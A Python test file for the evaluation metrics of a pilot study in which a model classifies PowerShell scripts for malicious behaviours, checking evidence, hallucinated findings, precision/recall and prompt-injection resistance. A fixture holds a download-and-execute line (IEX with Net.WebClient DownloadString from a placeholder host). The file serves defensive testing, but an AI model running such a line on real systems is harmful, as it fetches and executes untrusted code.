import copy

from experiments.evaluation import pilot_metrics as pm

REF_P5 = pm.CaseReference("P5", "PILOT-P5", frozenset({"B01", "B02"}), "high_risk",
                          {"B01": ("DownloadString",), "B02": ("IEX",)})
P5_TEXT = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/payload.txt')\n"


def finding(behavior, snippet, origin="analyzed_script"):
    return {"behavior_id": behavior, "explanation": "", "confidence": "high",
            "evidence": [{"snippet": snippet, "origin": origin}]}


def record(behaviors, risk="high_risk", fragments=(), valid=True, rep=1):
    result = {"behaviors": behaviors, "risk_label": risk, "obfuscation_techniques": [],
              "uncertainty": {"level": "low", "uninterpretable_fragments": list(fragments), "notes": ""},
              "prompt_injection": {"detected": False, "snippets": [], "notes": ""}}
    return {"repetition": rep, "schema_valid": valid, "json_valid": valid,
            "result": result if valid else None, "wall_seconds": 10.0,
            "metrics": {"prompt_eval_count": 1500, "eval_count": 300, "load_duration": 2_000_000_000}}


def test_correct_run():
    rec = record([finding("B01", "DownloadString('http://example.invalid/payload.txt')"), finding("B02", "IEX")])
    row = pm.evaluate_run(rec, REF_P5, P5_TEXT, {})
    assert row["exact_match"] and row["unsupported_claims"] == []
    assert all(ev["verifiable"] and ev["matches_reference_key"] for ev in row["evidence"])


def test_hallucinated_behavior_and_evidence_are_flagged():
    rec = record([finding("B01", "DownloadString"), finding("B02", "IEX"), finding("B04", "Set-MpPreference")])
    row = pm.evaluate_run(rec, REF_P5, P5_TEXT, {})
    assert not row["exact_match"]
    assert row["unsupported_claims"] == [{"behavior_id": "B04", "reason": "not_in_reference"}]
    assert row["evidence"][2]["location"] == "not_found"
    assert row["evidence"][2]["matches_reference_key"] is None


def test_correct_label_without_verifiable_evidence_is_unsupported():
    rec = record([finding("B01", "Invoke-WebRequest -Uri x"), finding("B02", "IEX")])
    row = pm.evaluate_run(rec, REF_P5, P5_TEXT, {})
    assert {"behavior_id": "B01", "reason": "no_verifiable_evidence"} in row["unsupported_claims"]


def test_failed_run_counts_as_empty_prediction():
    row = pm.evaluate_run(record([], valid=False), REF_P5, P5_TEXT, {})
    assert row["predicted_labels"] == [] and not row["exact_match"]
    prf = pm.multilabel_prf([row])
    assert prf["per_label"]["B01"]["fn"] == 1 and prf["micro"]["recall"] == 0.0


def test_multilabel_prf_values():
    rows = [
        {"predicted_labels": ["B01"], "reference_labels": ["B01", "B02"]},
        {"predicted_labels": ["B01", "B05"], "reference_labels": ["B01"]},
    ]
    prf = pm.multilabel_prf(rows)
    # tp=2 (B01 x2), fp=1 (B05), fn=1 (B02)
    assert prf["micro"] == {"precision": 0.6667, "recall": 0.6667, "f1": 0.6667}
    assert prf["per_label"]["B02"]["support"] == 1


def _row(labels, risk="benign", fragments=(), evidence=(), valid=True, case="P7"):
    return {"case_id": case, "schema_valid": valid, "predicted_labels": labels, "predicted_risk": risk,
            "uninterpretable_fragments": list(fragments), "evidence": list(evidence)}


def test_p7_rule():
    ok_ev = [{"behavior_id": "B01", "verifiable": True}]
    assert pm.p7_correct(_row(["B01"], evidence=ok_ev))
    assert pm.p7_correct(_row([], fragments=["'{2}{0}' -f ..."]))
    assert not pm.p7_correct(_row(["B01"], evidence=[{"behavior_id": "B01", "verifiable": False}]))
    assert not pm.p7_correct(_row(["B01", "B02"], evidence=ok_ev))
    assert not pm.p7_correct(_row([]))


def test_p8_rule():
    assert pm.p8_resisted(_row(["B03"], risk="suspicious", case="P8"))
    assert not pm.p8_resisted(_row(["B03"], risk="benign", case="P8"))
    assert not pm.p8_resisted(_row([], risk="suspicious", case="P8"))


def test_case_summary_stability():
    base = {"schema_valid": True, "exact_match": True, "predicted_labels": ["B01"], "predicted_risk": "benign"}
    other = {**base, "predicted_labels": ["B01", "B02"], "exact_match": False}
    s = pm.case_summary([base, copy.copy(base), other])
    assert s["stable"] and s["exact_match_majority"] and s["distinct_label_sets"] == 2
    s = pm.case_summary([base, other, {**base, "schema_valid": False, "exact_match": False}])
    assert not s["stable"]
